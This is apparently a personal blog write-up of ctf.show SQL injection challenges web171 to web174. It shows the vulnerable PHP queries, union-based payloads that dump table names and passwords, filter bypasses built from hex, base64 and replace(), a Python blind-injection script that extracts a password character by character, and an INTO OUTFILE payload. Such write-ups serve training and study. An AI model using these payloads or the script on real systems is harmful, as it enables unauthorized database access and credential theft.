<div class="page-information-card-container">
	
</div>

<div id="sidebar_mask"></div>
<aside id="leftbar" class="leftbar widget-area" role="complementary">
		
		<div id="leftbar_part1" class="widget widget_search card bg-white shadow-sm border-0">
			<div class="leftbar-banner card-body">
				<span class="leftbar-banner-title text-white">wanan</span>
				
				
			</div>
			
			
				<ul id='leftbar_part1_menu' class='leftbar-menu'>
					<li class='leftbar-menu-item'><a href='/'>首页</a></li><li class='leftbar-menu-item'><a href='/archives'>归档</a></li>
				</ul>
			
			<div class="card-body text-center leftbar-search-button">
				<button id="leftbar_search" class="btn btn-secondary btn-lg active btn-sm btn-block border-0" role="button" data-toggle="modal" data-target="#argon_search_modal" >
					<i class="menu-item-icon fa fa-search mr-0"></i> 搜索
				</button>
			</div>
		</div>
		<div id="leftbar_part2" class="widget widget_search card bg-white shadow-sm border-0">
			<div id="leftbar_part2_inner" class="card-body">
				
				<div class="nav-wrapper" style="padding-top: 5px;">
	                <ul class="nav nav-pills nav-fill" role="tablist">
						
							<li class="nav-item sidebar-tab-switcher">
								<a class="active show" id="leftbar_tab_catalog_btn" data-toggle="tab" href="#leftbar_tab_catalog" role="tab" aria-controls="leftbar_tab_catalog" no-pjax>文章目录</a>
							</li>
						
						<li class="nav-item sidebar-tab-switcher">
							<a class="" id="leftbar_tab_overview_btn" data-toggle="tab" href="#leftbar_tab_overview" role="tab" aria-controls="leftbar_tab_overview" no-pjax>站点概览</a>
						</li>
	                </ul>
				</div>
				<div>
					<div class="tab-content" style="padding: 10px 10px 0 10px;">
						
							<div class="tab-pane fade active show" id="leftbar_tab_catalog" role="tabpanel" aria-labelledby="leftbar_tab_catalog_btn">
								<div id="leftbar_catalog"></div>
								<script type="text/javascript">
									$(function () {
										$(document).headIndex({
											articleWrapSelector: '#post_content',
											indexBoxSelector: '#leftbar_catalog',
											subItemBoxClass: "index-subItem-box",
											itemClass: "index-item",
											linkClass: "index-link",
											offset: 80,
										});
									})
								</script>
								
							</div>
						
						<div class="tab-pane fade text-center" id="leftbar_tab_overview" role="tabpanel" aria-labelledby="leftbar_tab_overview_btn">
							<img id="leftbar_overview_author_image" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092159138.jpeg" class="img-fluid rounded-circle shadow-sm" style="width: 100px;" alt="avatar">
							<h6 id="leftbar_overview_author_name">wanan</h6>
							<nav class="site-state">
								<div class="site-state-item site-state-posts">
									<a href="/archives">
										<span class="site-state-item-count">58</span>
										<span class="site-state-item-name">文章</span>
									</a>
								</div>
								<div class="site-state-item site-state-categories">
									<a data-toggle="modal" data-target="#blog_categories">
										<span class="site-state-item-count">7</span>
										<span class="site-state-item-name">分类</span>
									</a>
								</div>      
								<div class="site-state-item site-state-tags">
									<a data-toggle="modal" data-target="#blog_tags">
										<span class="site-state-item-count">7</span>
										<span class="site-state-item-name">标签</span>
									</a>
								</div>
							</nav>
							
									<div class="site-author-links">
										
									</div>
								
							
									<div class='site-friend-links'>
										<div class='site-friend-links-title'><i class='fa fa-fw fa-link'></i> Links</div>
										<ul class='site-friend-links-ul'>
											
												<li class='site-friend-links-item'>
													<a href='https://argon-docs.solstice23.top/#/' rel='noopener' target='_blank'>Argon</a>
												</li>
											
										</ul>
									</div>
								
						</div>
					</div>
				</div>
			</div>
		</div>
</aside>
<div class="modal fade" id="blog_categories" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">分类</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<a class="badge badge-secondary tag" href="/categories/BUUCTF/" rel="tag">BUUCTF <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/Linux/" rel="tag">Linux <span class="tag-num">7</span></a><a class="badge badge-secondary tag" href="/categories/ctf/" rel="tag">ctf <span class="tag-num">26</span></a><a class="badge badge-secondary tag" href="/categories/ctfshow/" rel="tag">ctfshow <span class="tag-num">23</span></a><a class="badge badge-secondary tag" href="/categories/java%E7%9F%A5%E8%AF%86/" rel="tag">java知识 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/ctf/php%E7%9F%A5%E8%AF%86/" rel="tag">php知识 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/ctf/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入 <span class="tag-num">2</span></a>
			</div>
		</div>
	</div>
</div>
<div class="modal fade" id="blog_tags" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">标签</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<a class="badge badge-secondary tag" href="/tags/BUUCTF/" rel="tag">BUUCTF <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/Linux/" rel="tag">Linux <span class="tag-num">7</span></a><a class="badge badge-secondary tag" href="/tags/bugctf/" rel="tag">bugctf <span class="tag-num">2</span></a><a class="badge badge-secondary tag" href="/tags/ctf-show/" rel="tag">ctf.show <span class="tag-num">23</span></a><a class="badge badge-secondary tag" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/xctf/" rel="tag">xctf <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界 <span class="tag-num">9</span></a>
			</div>
		</div>
	</div>
</div>


<div id="primary" class="content-area">
	<main id="main" class="site-main" role="main">
		
		
			
	<article class="post post-full card bg-white shadow-sm border-0 ">
	<header class="post-header text-center">
		
		<a class="post-title" href="/ctfshow/ctf.show/sql/">sql</a>
		<div class="post-meta">
			
						
						<div class="post-meta-detail post-meta-detail-time">
							<i class="fa fa-clock-o" aria-hidden="true"></i>
							<time title="发布于 2022-4-17 22:37:17 | 编辑于 2022-4-18 15:29:35">2022-4-17 22:37
							</time>
						</div>
					
						
							<div class="post-meta-devide">|</div>
						
						<div class="post-meta-detail post-meta-detail-categories">
							<i class="fa fa-bookmark-o" aria-hidden="true"></i>
							<a class="post-meta-detail-catagory-link" href="/categories/ctfshow/">ctfshow</a>
						</div>
					
						
							<div class="post-meta-devide">|</div>
						
						<div class="post-meta-detail post-meta-detail-words">
							<i class="fa fa fa-book" aria-hidden="true"></i>
							<span id="busuanzi_container_page_pv">
								阅读<span id="busuanzi_value_page_pv"></span>次
							</span>
						</div>
					
						
							<div class="post-meta-devide">|</div>
						
						<div class="post-meta-detail post-meta-detail-words">
							<i class="fa fa-file-word-o" aria-hidden="true"></i>
							16.9k 字
						</div>
					
						
							<div class="post-meta-devide">|</div>
						
						<div class="post-meta-detail post-meta-detail-readingtime">
							<i class="fa fa-hourglass-end" aria-hidden="true"></i>
							91 分钟
						</div>
					
		</div>
		
	</header>

	<div class="post-content" id="post_content">
		<h1 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h1><p><a target="_blank" rel="noopener" href="https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/">注入学习</a></p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262159528.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220326215919454"></p>

<pre><code>$sql = &quot;select username,password from user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
</code></pre>
<p>象征性测试下闭合方式</p>
<pre><code>1    正常
1&#39;    异常
1&quot;    正常
</code></pre>
<p>说明是单引号闭合,测试字段数,这里注意使用%23哦</p>
<pre><code>1&#39; order by 3%23    正常
1&#39; order by 4%23    异常
</code></pre>
<p>说明三个,查回显地方</p>
<pre><code>1&#39; union select 1,2,3%23
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262202465.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220326220256430"></p>

<pre><code>1&#39; union select 1,database(),3%23
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262203899.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220326220315862"></p>

<p>爆数据库名</p>
<pre><code>1&#39;union select 1,group_concat(schema_name),3 from information_schema.schemata%23
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262204734.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220326220443697"></p>

<p>爆表名</p>
<pre><code>-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262205150.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220326220540113"></p>

<p>爆字段名</p>
<pre><code>-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;ctfshow_user&#39;%23
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271016776.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220327101643682"></p>

<pre><code>-1&#39;union select 1,group_concat(username,password),3 from ctfshow_user%23
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271017854.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220327101732815"></p>

<p>更简单的</p>
<pre><code>-1&#39; or 1%23
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301345625.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220330134534509"></p>

<pre><code>$sql = &quot;select username,password from user where username !=&#39;flag&#39; and id = &#39;-1&#39; or 1%23&#39; limit 1;&quot;;
</code></pre>
<h1 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301335972.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220330133530883"></p>

<pre><code>//拼接sql语句查找指定ID用户
$sql = &quot;select username,password from ctfshow_user2 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;

//检查结果是否有flag
    if($row-&gt;username!==&#39;flag&#39;)&#123;
      $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
    &#125;  
</code></pre>
<pre><code>字段
1&#39; order by 3%23    异常
1&#39; order by 2%23    正常

数据库
1&#39; union select 1,database()%23
1&#39;union select 1,group_concat(schema_name) from information_schema.schemata%23

表名
-1&#39;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23    #有两张表,第二张是这关的

字段名
-1&#39;union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_user&#39;%23

数据
-1&#39;union select 1,group_concat(username,password) from ctfshow_user2%23
</code></pre>
<p>新学的base64加密</p>
<pre><code>0&#39; union select 1,to_base64(password) from ctfshow_user2 where username=&quot;flag&quot;%23
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301358191.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220330135800134"></p>

<h1 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407094914986.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407094914986"></p>

<pre><code>//拼接sql语句查找指定ID用户
$sql = &quot;select id,username,password from ctfshow_user3 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;

//检查结果是否有flag
    if(!preg_match(&#39;/flag/i&#39;, json_encode($ret)))&#123;
      $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
    &#125;
</code></pre>
<p>与上面差不多,换一个函数</p>
<pre><code>0&#39; union select 1,hex(password),3 from ctfshow_user3 where username=&quot;flag&quot;%23
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407095103698.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407095103698"></p>

<h1 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407095244739.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407095244739"></p>

<pre><code>/拼接sql语句查找指定ID用户
$sql = &quot;select username,password from ctfshow_user4 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
sel
//检查结果是否有flag
    if(!preg_match(&#39;/flag|[0-9]/i&#39;, json_encode($ret)))&#123;
      $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
    &#125;
</code></pre>
<p>这里返回一般不让有flag和数字,那么我们想办法替换一下,替换的思路将1-0数字用q~p替换，但本来的flag中一定也会有一些小写字母，这样的话就没办法分辨那个是原本的字母哪个是替换出来的。所以为了避免这个问题，将password首先hex一下，因为hex()函数的返回值中字母都是大写的，所以我们返回结果中的小写字母就是原来的数字，而大写字母就是原本的字符。</p>
<pre><code>1&#39; union select &#39;q&#39;,(select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),&#39;1&#39;,&#39;q&#39;),&#39;2&#39;,&#39;w&#39;),&#39;3&#39;,&#39;e&#39;),&#39;4&#39;,&#39;r&#39;),&#39;5&#39;,&#39;t&#39;),&#39;6&#39;,&#39;y&#39;),&#39;7&#39;,&#39;u&#39;),&#39;8&#39;,&#39;i&#39;),&#39;9&#39;,&#39;o&#39;),&#39;0&#39;,&#39;p&#39;) from ctfshow_user4 where username=&#39;flag&#39;)--+
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407095715741.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407095715741"></p>

<p>在自己替换一下</p>
<p>盲注测试一下下</p>
<p>抓包发现向这个页面请求的数据</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407102847062.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407102847062"></p>

<pre><code>1&#39; and length(database())&gt;0%23    
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407103005812.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407103005812"></p>

<pre><code>1&#39; and length(database())=0%23    
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407103025956.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407103025956"></p>

<p>也就是说如果后面为真就返回admin,如果后面为假就不返回admin</p>
<h2 id="get有回显布尔无空格和逗号的脚本"><a href="#get有回显布尔无空格和逗号的脚本" class="headerlink" title="get有回显布尔无空格和逗号的脚本"></a>get有回显布尔无空格和逗号的脚本</h2><pre><code class="python">#payload = 1&#39;&amp;&amp;length((select(password)from(ctfshow_user4)where(id=26)))&gt;&#123;mid&#125;#
def get_pwd_len(url):
    head = 1
    tail = 100
    ans = 0
    while head &lt; tail:
        mid = (head + tail ) &gt;&gt; 1
        payload = f&quot;1&#39;&amp;&amp;length((select(password)from(ctfshow_user4)where(id=26)))&gt;&#123;mid&#125;#&quot;
        # print(uname)
        param = &#123;
            &#39;id&#39;: payload,
            &#39;page&#39;: &#39;1&#39;,
            &#39;limit&#39;: &#39;10&#39;
        &#125;
        res = requests.get(url=url,params=param)
        if &quot;admin&quot; in res.text:
            head = mid + 1
            ans = mid + 1
        else:
            tail = mid
    print(ans)

        # passwd长度为:45
url=&quot;http://c0fd21f5-b919-4d9c-aac8-de4d325b3a8b.challenge.ctf.show/api/v4.php&quot;
get_pwd_len(url)

#payload = 1&#39;&amp;&amp;ascii(substr((reverse(substr((select(password)from(ctfshow_user4)where(id=26))from(&#123;i&#125;))))from(&#123;j&#125;)))&gt;&#123;mid&#125;#
def get_pwd(url):
    ans = &quot;&quot;
    for i in range(1, 46):
        # print(i)
        j = 46 - i
        # print(j)
        head = 32
        tail = 127
        while head &lt;tail:
            mid = (head + tail) &gt;&gt; 1 #&gt;&gt;是位移运算符 右移一位就是除以二
            payload = f&quot;1&#39;&amp;&amp;ascii(substr((reverse(substr((select(password)from(ctfshow_user4)where(id=26))from(&#123;i&#125;))))from(&#123;j&#125;)))&gt;&#123;mid&#125;#&quot;
            # print(uname)
            param = &#123;
                &#39;id&#39;: payload,
                &#39;page&#39;: &#39;1&#39;,
                &#39;limit&#39;: &#39;10&#39;
            &#125;
            res = requests.get(url=url,params=param)
            # print(res.text)
            if &quot;admin&quot; in res.text:
                head = mid + 1
            else:
                tail = mid
        if head != 32:
            ans += chr(head)
        else:
            break
        print(ans)
url=&quot;http://c0fd21f5-b919-4d9c-aac8-de4d325b3a8b.challenge.ctf.show/api/v4.php&quot;
get_pwd(url)
</code></pre>
<p>除了盲注还可以写文件</p>
<pre><code>/api/v4.php?id=1&#39; union select 1,password from ctfshow_user4 into outfile &#39;/var/www/html/1.txt&#39;--+&amp;page=1&amp;limit=10
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407130358634.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407130358634"></p>

